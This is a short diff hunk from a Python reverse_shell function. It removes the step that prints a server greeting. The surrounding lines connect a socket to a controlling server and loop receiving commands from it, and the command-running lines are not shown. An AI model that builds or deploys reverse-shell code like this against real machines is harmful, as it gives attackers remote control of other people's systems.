@@ -396,10 +396,6 @@ def reverse_shell(SERVER_HOST, SERVER_PORT):
     # connect to the server
     s.connect((SERVER_HOST, SERVER_PORT))
 
-    # receive the greeting message
-    message = s.recv(BUFFER_SIZE).decode()
-    print("Server:", message)
-
     while True:
         # receive the command from the server
         command = s.recv(BUFFER_SIZE).decode()
